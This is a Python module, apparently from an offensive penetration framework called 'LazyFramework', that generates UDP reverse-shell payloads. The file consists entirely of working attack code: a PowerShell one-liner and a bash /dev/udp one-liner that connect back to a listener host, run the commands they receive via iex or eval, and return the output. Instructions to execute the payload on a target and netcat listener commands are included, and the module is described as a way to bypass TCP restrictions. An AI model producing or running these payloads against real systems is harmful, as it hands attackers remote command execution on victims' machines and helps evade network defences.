# /root/lazy1/modules/payloads/reverse/network/udp_reverse.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "UDP Reverse Shell",
    "description": "UDP-based reverse shell for bypassing TCP restrictions",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Multi",
    "arch": "Multi", 
    "rank": "Good",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True,
        "default": "4444"
    },
    "platform": {
        "description": "Target platform",
        "required": False,
        "default": "linux",
        "choices": ["linux", "windows", "multi"]
    }
}

def generate_udp_reverse(lhost, lport, platform="linux"):
    """Generate UDP reverse shell"""
    
    if platform == "windows":
        return f'''powershell -c "$u=New-Object System.Net.Sockets.UdpClient('{lhost}',{lport});$s=$u.Client;while($true){{$s.Send([Text.Encoding]::ASCII.GetBytes('UDP> '));$r=$u.Receive([ref]$e);$c=[Text.Encoding]::ASCII.GetString($r);$o=iex $c 2>&1|Out-String;$s.Send([Text.Encoding]::ASCII.GetBytes($o))}}"'''
    
    else:  # linux
        return f"bash -c 'exec 3<>/dev/udp/{lhost}/{lport};echo \"UDP Connected\" >&3;while read -r cmd <&3;do eval \"$cmd\" >&3 2>&3;done'"

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    platform = options.get("platform", "linux")
    
    console.print("\n[bold green]📡 UDP Reverse Shell[/bold green]")
    console.print("=" * 50)
    
    payload = generate_udp_reverse(lhost, lport, platform)
    
    console.print(f"\n[bold]Protocol:[/bold] UDP")
    console.print(f"[bold]Listener:[/bold] {lhost}:{lport}")
    console.print(f"[bold]Platform:[/bold] {platform}")
    console.print(f"[bold]Use Case:[/bold] Bypass TCP restrictions")
    
    console.print(f"\n[bold yellow]📦 Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="green"))
    
    console.print(f"\n[bold green]🚀 Usage:[/bold green]")
    console.print("1. Start UDP listener (see below)")
    console.print("2. Execute payload on target")
    console.print("3. Commands are sent via UDP packets")
    
    console.print(f"\n[bold blue]🎯 UDP Listener:[/bold blue]")
    console.print(f"nc -u -lnvp {lport}")
    console.print(f"Or: ncat -u -lvp {lport}")
    
    console.print(f"\n[bold red]⚠️  Note:[/bold red] UDP is connectionless - reliability may vary")
    
    return payload
